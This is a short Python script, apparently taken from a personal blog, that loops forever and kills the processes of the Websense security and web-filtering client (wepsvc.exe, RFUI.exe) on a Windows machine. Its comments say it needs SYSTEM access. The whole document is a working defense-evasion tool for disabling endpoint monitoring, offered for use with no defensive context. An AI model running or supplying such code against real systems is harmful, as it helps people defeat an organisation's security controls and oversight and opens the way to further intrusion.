#kill websense client on the localsystem
#need to have SYSTEM access on windows
#http://hi.baidu.com/qingsh4n/item/2afd67849146293c110ef3a0

import psutil

while 1:
	plist=psutil.process_iter()
	for i in plist:
		if i.name=="wepsvc.exe":
			print "Killing %d(%s)"%(i.pid,i.name)
			i.kill()
		if i.name=="RFUI.exe":
			print "Killing %d(%s)"%(i.pid,i.name)
			i.kill()
	
